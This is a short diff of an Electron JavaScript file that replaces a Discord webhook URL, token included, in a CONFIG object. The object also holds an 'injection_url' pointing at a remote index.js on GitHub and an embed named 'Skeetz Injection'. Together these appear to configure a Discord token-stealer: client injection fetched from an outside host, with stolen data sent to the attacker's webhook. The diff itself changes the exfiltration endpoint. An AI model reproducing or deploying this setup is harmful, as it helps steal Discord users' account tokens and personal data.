@@ -10,7 +10,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "https://ptb.discord.com/api/webhooks/1368246057686794260/0O8nPsq25Vlm9wrzWqJvmunYcoQQXKXonDrJDo4fpb8PRBZPha5YX5r8pJl5_VPIFuHT",
+    webhook: "https://ptb.discord.com/api/webhooks/1369108575590289528/3jU5y3NDvfyw9DcuH61QGGcdtTIri6WNyOoN07qPvJPaIxCapXkgdYFAn4GdICqEHEaP",
     injection_url: "https://raw.githubusercontent.com/Mano6g/MCESTUdo/refs/heads/main/index.js",
     embed_name: "💉・ Skeetz Injection ・💉",
     embed_icon: "https://i.imgur.com/RbT31Ow.png",
